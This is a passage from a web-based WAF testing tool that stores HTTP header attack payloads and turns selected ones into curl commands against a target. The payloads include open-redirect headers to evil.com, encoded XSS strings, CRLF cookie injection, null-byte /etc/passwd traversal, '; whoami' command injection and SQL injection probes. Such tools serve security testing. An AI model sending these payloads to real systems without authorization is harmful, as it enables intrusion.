                    { name: "X-Return-URL", payload: "X-Return-URL: http://evil.com", severity: "medium" },
                    { name: "X-Success-URL", payload: "X-Success-URL: http://evil.com", severity: "medium" },
                    { name: "X-Failure-URL", payload: "X-Failure-URL: http://evil.com", severity: "medium" },
                    { name: "X-Redirect-URL", payload: "X-Redirect-URL: http://evil.com", severity: "medium" },
                    { name: "X-Forward-URL", payload: "X-Forward-URL: http://evil.com", severity: "medium" },
                    { name: "X-Callback-URL", payload: "X-Callback-URL: http://evil.com", severity: "medium" },
                    
                    // URL manipulation
                    { name: "X-Original-URL Open", payload: "X-Original-URL: http://evil.com", severity: "high" },
                    { name: "X-Rewrite-URL Open", payload: "X-Rewrite-URL: //evil.com", severity: "high" },
                    
                    // Protocol-relative
                    { name: "Protocol Relative", payload: "X-Return-URL: //evil.com", severity: "medium" },
                    { name: "Backslash Redirect", payload: "X-Return-URL: \\\\evil.com", severity: "medium" },
                    { name: "Mixed Slashes", payload: "X-Return-URL: /\\evil.com", severity: "medium" },
                    
                    // Encoded redirects
                    { name: "URL Encoded", payload: "X-Return-URL: http%3A%2F%2Fevil.com", severity: "medium" },
                    { name: "Double Encoded", payload: "X-Return-URL: http%253A%252F%252Fevil.com", severity: "medium" },
                    { name: "Unicode Encoded", payload: "X-Return-URL: http://evil\\u002ecom", severity: "medium" }
                ]
            },
            
            "Buffer Overflow": {
                icon: "fa-bomb",
                tests: [
                    // Long headers
                    { name: "Long Header Value 8K", payload: "X-Test: " + "A".repeat(8192), severity: "medium" },
                    { name: "Long Header Value 16K", payload: "X-Test: " + "A".repeat(16384), severity: "medium" },
                    { name: "Long Header Value 32K", payload: "X-Test: " + "A".repeat(32768), severity: "medium" },
                    { name: "Long Header Value 64K", payload: "X-Test: " + "A".repeat(65536), severity: "high" },
                    { name: "Long Header Name 1K", payload: "X-" + "A".repeat(1024) + ": value", severity: "medium" },
                    { name: "Long Header Name 8K", payload: "X-" + "A".repeat(8192) + ": value", severity: "high" },
                    
                    // Format strings
                    { name: "Format String %s", payload: "X-Test: %s%s%s%s%s%s%s%s%s%s", severity: "low" },
                    { name: "Format String %x", payload: "X-Test: %x%x%x%x%x%x%x%x%x%x", severity: "low" },
                    { name: "Format String %n", payload: "X-Test: %n%n%n%n%n%n%n%n%n%n", severity: "medium" },
                    { name: "Format String %p", payload: "X-Test: %p%p%p%p%p%p%p%p%p%p", severity: "low" },
                    { name: "Format String Mix", payload: "X-Test: %s%p%x%d%n", severity: "medium" },
                    
                    // Integer overflow
                    { name: "Content-Length Max", payload: "Content-Length: 18446744073709551615", severity: "high" },
                    { name: "Content-Length Negative", payload: "Content-Length: -1", severity: "medium" },
                    { name: "Content-Length Hex", payload: "Content-Length: 0xFFFFFFFF", severity: "low" },
                    { name: "Content-Length Float", payload: "Content-Length: 13.37", severity: "low" },
                    { name: "Content-Length Scientific", payload: "Content-Length: 1e10", severity: "low" },
                    
                    // Unicode overflow
                    { name: "Unicode Expansion", payload: "X-Test: " + "".repeat(1000), severity: "medium" },
                    { name: "Emoji Overflow", payload: "X-Test: " + "".repeat(2000), severity: "low" },
                    { name: "RTL Unicode", payload: "X-Test: " + "".repeat(1000), severity: "low" },
                    
                    // Null bytes
                    { name: "Multiple Nulls", payload: "X-Test: " + "\\x00".repeat(100), severity: "medium" },
                    { name: "Null Pattern", payload: "X-Test: A\\x00B\\x00C\\x00D\\x00E", severity: "low" }
                ]
            },
            
            "Encoding Bypasses": {
                icon: "fa-code",
                tests: [
                    // URL encoding
                    { name: "Single URL Encode", payload: "X-Test: %3Cscript%3Ealert%281%29%3C%2Fscript%3E", severity: "medium" },
                    { name: "Double URL Encode", payload: "X-Test: %253Cscript%253Ealert%25281%2529%253C%252Fscript%253E", severity: "medium" },
                    { name: "Triple URL Encode", payload: "X-Test: %25253Cscript%25253Ealert%2525281%252529%25253C%25252Fscript%25253E", severity: "medium" },
                    { name: "Mixed Case URL", payload: "X-Test: %3cSCRIPT%3eALERT(1)%3c/SCRIPT%3e", severity: "medium" },
                    { name: "Partial URL Encode", payload: "X-Test: %3Cscript>alert(1)< /script>", severity: "medium" },
                    
                    // Unicode encoding
                    { name: "Unicode Escape", payload: "X-Test: \\u003Cscript\\u003Ealert(1)\\u003C/script\\u003E", severity: "medium" },
                    { name: "Unicode Mixed", payload: "X-Test: \\u003Cscript>alert\\u00281\\u0029< /script>", severity: "medium" },
                    { name: "UTF-16 Encode", payload: "X-Test: \\u{003C}script\\u{003E}alert(1)\\u{003C}/script\\u{003E}", severity: "medium" },
                    { name: "Overlong UTF-8", payload: "X-Test: \\xC0\\x80\\xC0\\xBC", severity: "medium" },
                    
                    // HTML encoding
                    { name: "HTML Entity Decimal", payload: "X-Test: &#60;script&#62;alert(1)&#60;/script&#62;", severity: "low" },
                    { name: "HTML Entity Hex", payload: "X-Test: &#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;", severity: "low" },
                    { name: "HTML Entity Named", payload: "X-Test: &lt;script&gt;alert(1)&lt;/script&gt;", severity: "low" },
                    { name: "HTML Entity Mixed", payload: "X-Test: &lt;script&#62;alert&#x28;1&#41;&#60;/script&gt;", severity: "low" },
                    
                    // Base64 encoding
                    { name: "Base64 Payload", payload: "X-Test: PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==", severity: "low" },
                    { name: "Base64 Command", payload: "X-Test: d2hvYW1p", severity: "low" },
                    { name: "Base64 Path", payload: "X-Test: Li4vLi4vLi4vZXRjL3Bhc3N3ZA==", severity: "low" },
                    
                    // Hex encoding
                    { name: "Hex Encode", payload: "X-Test: 0x3C7363726970743E616C6572742831293C2F7363726970743E", severity: "low" },
                    { name: "Hex Escape", payload: "X-Test: \\x3C\\x73\\x63\\x72\\x69\\x70\\x74\\x3E", severity: "medium" },
                    
                    // Octal encoding
                    { name: "Octal Encode", payload: "X-Test: \\074\\163\\143\\162\\151\\160\\164\\076", severity: "low" },
                    { name: "Octal Mixed", payload: "X-Test: \\74script\\76alert(1)\\74/script\\76", severity: "low" },
                    
                    // Case variations
                    { name: "Upper Case", payload: "X-Test: <SCRIPT>ALERT(1)< /SCRIPT>", severity: "low" },
                    { name: "Lower Case", payload: "X-Test: <script>alert(1)< /script>", severity: "low" },
                    { name: "Mixed Case", payload: "X-Test: <ScRiPt>AlErT(1)< /sCrIpT>", severity: "low" },
                    { name: "Random Case", payload: "X-Test: <sCRipT>aLerT(1)< /scRIpT>", severity: "low" },
                    
                    // Charset encoding
                    { name: "UTF-7 Encode", payload: "X-Test: +ADw-script+AD4-a lert(1)+ADw-/script+AD4-", severity: "medium" },
                    { name: "UTF-32 Encode", payload: "X-Test: \\U0000003C\\U00000073\\U00000063\\U00000072", severity: "low" },
                    { name: "EBCDIC Encode", payload: "X-Test: \\x4C\\xA2\\x83\\x99\\x89\\x97\\xA3\\x6E", severity: "low" }
                ]
            },
            
            "Protocol Smuggling": {
                icon: "fa-mask",
                tests: [
                    // HTTP version confusion
                    { name: "HTTP/0.9 Request", payload: "X-Test: test\\r\\n\\r\\nGET /admin\\r\\n", severity: "medium" },
                    { name: "HTTP/1.0 Request", payload: "X-Test: test\\r\\n\\r\\nGET /admin HTTP/1.0\\r\\n", severity: "medium" },
                    { name: "HTTP/2.0 Smuggle", payload: "X-Test: test\\r\\n\\r\\nPRI * HTTP/2.0\\r\\n", severity: "high" },
                    { name: "HTTP/3.0 Smuggle", payload: "X-Test: test\\r\\n\\r\\nGET /admin HTTP/3.0\\r\\n", severity: "medium" },
                    { name: "Invalid Version", payload: "X-Test: test\\r\\n\\r\\nGET /admin HTTP/9.9\\r\\n", severity: "low" },
                    
                    // Method confusion
                    { name: "WebDAV PROPFIND", payload: "X-HTTP-Method: PROPFIND", severity: "medium" },
                    { name: "WebDAV PROPPATCH", payload: "X-HTTP-Method: PROPPATCH", severity: "medium" },
                    { name: "WebDAV MKCOL", payload: "X-HTTP-Method: MKCOL", severity: "medium" },
                    { name: "WebDAV COPY", payload: "X-HTTP-Method: COPY", severity: "medium" },
                    { name: "WebDAV MOVE", payload: "X-HTTP-Method: MOVE", severity: "medium" },
                    { name: "WebDAV LOCK", payload: "X-HTTP-Method: LOCK", severity: "medium" },
                    { name: "WebDAV UNLOCK", payload: "X-HTTP-Method: UNLOCK", severity: "medium" },
                    { name: "Custom Method", payload: "X-HTTP-Method: HACK", severity: "low" },
                    
                    // Upgrade headers
                    { name: "WebSocket Upgrade", payload: "Upgrade: websocket\\r\\nConnection: Upgrade", severity: "medium" },
                    { name: "H2C Upgrade", payload: "Upgrade: h2c\\r\\nConnection: Upgrade", severity: "medium" },
                    { name: "HTTP2 Upgrade", payload: "Upgrade: HTTP/2.0\\r\\nConnection: Upgrade", severity: "medium" },
                    { name: "SPDY Upgrade", payload: "Upgrade: SPDY/3.1\\r\\nConnection: Upgrade", severity: "low" },
                    { name: "Custom Protocol", payload: "Upgrade: custom-protocol\\r\\nConnection: Upgrade", severity: "low" },
                    
                    // Connection headers
                    { name: "Connection Close TE", payload: "Connection: close, TE\\r\\nTE: trailers", severity: "medium" },
                    { name: "Connection Keep TE", payload: "Connection: keep-alive, TE\\r\\nTE: chunked", severity: "medium" },
                    { name: "Connection Upgrade TE", payload: "Connection: upgrade, TE\\r\\nTE: gzip", severity: "medium" },
                    
                    // TE variations
                    { name: "TE Trailers", payload: "TE: trailers, deflate", severity: "low" },
                    { name: "TE Compress", payload: "TE: compress, gzip", severity: "low" },
                    { name: "TE Q Values", payload: "TE: trailers, deflate;q=0.5", severity: "low" }
                ]
            },
            
            "Null Bytes": {
                icon: "fa-times-circle",
                tests: [
                    // Basic null bytes
                    { name: "Null in Value", payload: "X-Test: value\\x00secret", severity: "high" },
                    { name: "Null in Name", payload: "X-Test\\x00: value", severity: "high" },
                    { name: "Multiple Nulls", payload: "X-Test: \\x00\\x00\\x00", severity: "medium" },
                    { name: "Null Start", payload: "X-Test: \\x00value", severity: "medium" },
                    { name: "Null End", payload: "X-Test: value\\x00", severity: "medium" },
                    { name: "Null Middle", payload: "X-Test: val\\x00ue", severity: "medium" },
                    
                    // Null byte injection
                    { name: "Null CRLF", payload: "X-Test: value\\x00\\r\\nSet-Cookie: admin=true", severity: "critical" },
                    { name: "Null Extension", payload: "X-File: /etc/passwd\\x00.jpg", severity: "high" },
                    { name: "Null Command", payload: "X-File: test.txt\\x00; whoami", severity: "high" },
                    { name: "Null SQL", payload: "X-User: admin\\x00' OR '1'='1", severity: "high" },
                    { name: "Null Path", payload: "X-File: ..\\x00/..\\x00/..\\x00/etc/passwd", severity: "high" },
                    
                    // Encoded nulls
                    { name: "URL Encoded Null", payload: "X-Test: value%00secret", severity: "medium" },
                    { name: "Double Encoded Null", payload: "X-Test: value%2500secret", severity: "medium" },
                    { name: "Unicode Null", payload: "X-Test: value\\u0000secret", severity: "medium" },
                    { name: "HTML Entity Null", payload: "X-Test: value&#00;secret", severity: "low" },
                    { name: "Hex Null", payload: "X-Test: value\\x00secret", severity: "high" },
                    { name: "Octal Null", payload: "X-Test: value\\000secret", severity: "medium" },
                    
                    // Null variations
                    { name: "C String Null", payload: "X-Test: value\\0secret", severity: "medium" },
                    { name: "Modified Null", payload: "X-Test: value\\xC0\\x80secret", severity: "medium" },
                    { name: "Wide Null", payload: "X-Test: value\\x00\\x00secret", severity: "medium" }
                ]
            },
            
            "Special Characters": {
                icon: "fa-asterisk",
                tests: [
                    // Control characters
                    { name: "SOH Character", payload: "X-Test: \\x01", severity: "low" },
                    { name: "STX Character", payload: "X-Test: \\x02", severity: "low" },
                    { name: "ETX Character", payload: "X-Test: \\x03", severity: "low" },
                    { name: "EOT Character", payload: "X-Test: \\x04", severity: "low" },
                    { name: "ENQ Character", payload: "X-Test: \\x05", severity: "low" },
                    { name: "ACK Character", payload: "X-Test: \\x06", severity: "low" },
                    { name: "BEL Character", payload: "X-Test: \\x07", severity: "low" },
                    { name: "VT Character", payload: "X-Test: \\x0B", severity: "low" },
                    { name: "FF Character", payload: "X-Test: \\x0C", severity: "low" },
                    { name: "SO Character", payload: "X-Test: \\x0E", severity: "low" },
                    { name: "SI Character", payload: "X-Test: \\x0F", severity: "low" },
                    { name: "DLE Character", payload: "X-Test: \\x10", severity: "low" },
                    { name: "DC1 Character", payload: "X-Test: \\x11", severity: "low" },
                    { name: "DC2 Character", payload: "X-Test: \\x12", severity: "low" },
                    { name: "DC3 Character", payload: "X-Test: \\x13", severity: "low" },
                    { name: "DC4 Character", payload: "X-Test: \\x14", severity: "low" },
                    { name: "NAK Character", payload: "X-Test: \\x15", severity: "low" },
                    { name: "SYN Character", payload: "X-Test: \\x16", severity: "low" },
                    { name: "ETB Character", payload: "X-Test: \\x17", severity: "low" },
                    { name: "CAN Character", payload: "X-Test: \\x18", severity: "low" },
                    { name: "EM Character", payload: "X-Test: \\x19", severity: "low" },
                    { name: "SUB Character", payload: "X-Test: \\x1A", severity: "low" },
                    { name: "FS Character", payload: "X-Test: \\x1C", severity: "low" },
                    { name: "GS Character", payload: "X-Test: \\x1D", severity: "low" },
                    { name: "RS Character", payload: "X-Test: \\x1E", severity: "low" },
                    { name: "US Character", payload: "X-Test: \\x1F", severity: "low" },
                    { name: "DEL Character", payload: "X-Test: \\x7F", severity: "low" },
                    
                    // High ASCII
                    { name: "High ASCII 80", payload: "X-Test: \\x80", severity: "low" },
                    { name: "High ASCII FF", payload: "X-Test: \\xFF", severity: "low" },
                    { name: "High ASCII Range", payload: "X-Test: \\x80\\x90\\xA0\\xB0\\xC0\\xD0\\xE0\\xF0\\xFF", severity: "low" }
                ]
            }
        };

        // Initialize
        function init() {
            renderTests();
            updateCounts();
        }

        // Render tests
        function renderTests() {
            const container = document.getElementById('testContainer');
            container.innerHTML = '';
            
            Object.keys(testDatabase).forEach(categoryName => {
                const category = testDatabase[categoryName];
                const categoryDiv = document.createElement('div');
                categoryDiv.className = 'bg-white rounded-lg shadow-sm border border-gray-200 p-6';
                categoryDiv.dataset.category = categoryName;
                
                const testCards = category.tests.map((test, index) => `
                    <div class="test-item card-hover rounded-lg p-3 cursor-pointer"
                         data-category="${categoryName}"
                         data-index="${index}"
                         data-severity="${test.severity}"
                         onclick="toggleTest(this)">
                        <div class="flex items-center">
                            <input type="checkbox" class="mr-3 test-checkbox" onclick="event.stopPropagation()">
                            <div class="flex-1">
                                <div class="font-medium text-sm">${test.name}</div>
                                <span class="text-xs px-2 py-0.5 rounded-full severity-${test.severity}">
                                    ${test.severity}
                                </span>
                            </div>
                        </div>
                    </div>
                `).join('');
                
                categoryDiv.innerHTML = `
                    <div class="flex items-center justify-between mb-4">
                        <h3 class="text-lg font-semibold flex items-center">
                            <i class="fas ${category.icon} text-gray-400 mr-2"></i>
                            ${categoryName}
                            <span class="ml-2 text-sm text-gray-500">(${category.tests.length} tests)</span>
                        </h3>
                        <button onclick="toggleCategory('${categoryName}')" class="text-sm text-gray-600 hover:text-gray-800">
                            Select All
                        </button>
                    </div>
                    <div class="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-2">
                        ${testCards}
                    </div>
                `;
                
                container.appendChild(categoryDiv);
            });
        }

        // Toggle test selection
        function toggleTest(element) {
            const checkbox = element.querySelector('.test-checkbox');
            checkbox.checked = !checkbox.checked;
            element.classList.toggle('test-selected', checkbox.checked);
            updateCounts();
        }

        // Toggle category
        function toggleCategory(categoryName) {
            const category = document.querySelector(`[data-category="${categoryName}"]`);
            const checkboxes = category.querySelectorAll('.test-checkbox');
            const allChecked = Array.from(checkboxes).every(cb => cb.checked);
            
            checkboxes.forEach(cb => {
                cb.checked = !allChecked;
                cb.closest('.test-item').classList.toggle('test-selected', !allChecked);
            });
            
            updateCounts();
        }

        // Update counts
        function updateCounts() {
            const total = document.querySelectorAll('.test-checkbox').length;
            const selected = document.querySelectorAll('.test-checkbox:checked').length;
            
            document.getElementById('totalCount').textContent = total;
            document.getElementById('selectedCount').textContent = selected;
            document.getElementById('selectedBadge').textContent = selected;
        }

        // Select preset
        function selectPreset(preset) {
            clearAll();
            
            const presets = {
                critical: () => document.querySelectorAll('[data-severity="critical"]'),
                injection: () => {
                    const categories = ['SQL Injection', 'Command Injection', 'CRLF Injection', 'XXE Injection'];
                    return document.querySelectorAll(categories.map(c => `[data-category="${c}"] .test-item`).join(','));
                },
                smuggling: () => document.querySelectorAll('[data-category="Request Smuggling"] .test-item'),
                all: () => document.querySelectorAll('.test-item')
            };
            
            const items = presets[preset]();
            items.forEach(item => {
                const checkbox = item.querySelector('.test-checkbox');
                if (checkbox) {
                    checkbox.checked = true;
                    item.classList.add('test-selected');
                }
            });
            
            updateCounts();
        }

        // Clear all
        function clearAll() {
            document.querySelectorAll('.test-item').forEach(item => {
                item.querySelector('.test-checkbox').checked = false;
                item.classList.remove('test-selected');
            });
            updateCounts();
        }

        // Generate commands
        function generateCommands() {
            const selected = getSelectedTests();
            if (selected.length === 0) {
                alert('Please select at least one test');
                return;
            }
            
            const targetUrl = document.getElementById('targetUrl').value;
            const proxyUrl = document.getElementById('proxyUrl').value;
            
            let commands = `# WAF Header Attack Testing - Generated Curl Commands
# Target: ${targetUrl}
# Tests: ${selected.length}
# Generated: ${new Date().toISOString()}
${proxyUrl ? `# Proxy: ${proxyUrl}` : ''}

`;
            
            selected.forEach(({ category, test }, index) => {
                // Build the curl command
                let cmd = `curl -v`;
                
                if (proxyUrl) {
                    cmd += ` -x "${proxyUrl}"`;
                }
                
                // Properly escape the payload for curl
                let payload = test.payload
                    .replace(/\\/g, '\\\\')  // Escape backslashes
                    .replace(/"/g, '\\"')    // Escape quotes
                    .replace(/\$/g, '\\$')   // Escape dollar signs
                    .replace(/`/g, '\\`');   // Escape backticks
                
                // Convert escape sequences
                payload = payload
                    .replace(/\\\\r/g, '\\r')
                    .replace(/\\\\n/g, '\\n')
                    .replace(/\\\\t/g, '\\t')
                    .replace(/\\\\x([0-9A-Fa-f]{2})/g, '\\x$1');
                
                if (payload.includes(':')) {
                    // It's a header
                    cmd += ` -H "${payload}"`;
                } else {
                    // Raw data
                    cmd += ` --data-raw "${payload}"`;
                }
                
                cmd += ` "${targetUrl}"`;
                
                commands += `# Test ${index + 1}: ${category} - ${test.name} [${test.severity.toUpperCase()}]\n`;
                commands += `${cmd}\n\n`;
            });
            
            document.getElementById('outputContent').textContent = commands;
            document.getElementById('outputModal').classList.remove('hidden');
        }

        // Get selected tests
        function getSelectedTests() {
            const selected = [];
            document.querySelectorAll('.test-checkbox:checked').forEach(checkbox => {
                const item = checkbox.closest('.test-item');
                const category = item.dataset.category;
                const index = parseInt(item.dataset.index);
                const test = testDatabase[category].tests[index];
                selected.push({ category, test });
            });
            return selected;
        }

        // Copy commands
        function copyCommands() {
            const content = document.getElementById('outputContent').textContent;
            navigator.clipboard.writeText(content).then(() => {
                const btn = event.target.closest('button');
                const originalText = btn.innerHTML;
                btn.innerHTML = '<i class="fas fa-check mr-1"></i>Copied!';
                setTimeout(() => {
                    btn.innerHTML = originalText;
                }, 2000);
            });
        }

        // Download commands
        function downloadCommands() {
            const content = document.getElementById('outputContent').textContent;
            const filename = `waf_header_tests_${new Date().getTime()}.sh`;
            
            const blob = new Blob([content], { type: 'text/plain' });
            const url = window.URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = filename;
            a.click();
            window.URL.revokeObjectURL(url);
        }

        // Close modal
        function closeModal() {
            document.getElementById('outputModal').classList.add('hidden');
        }

        // Initialize on load
        document.addEventListener('DOMContentLoaded', init);
    </script>
</body>
</html>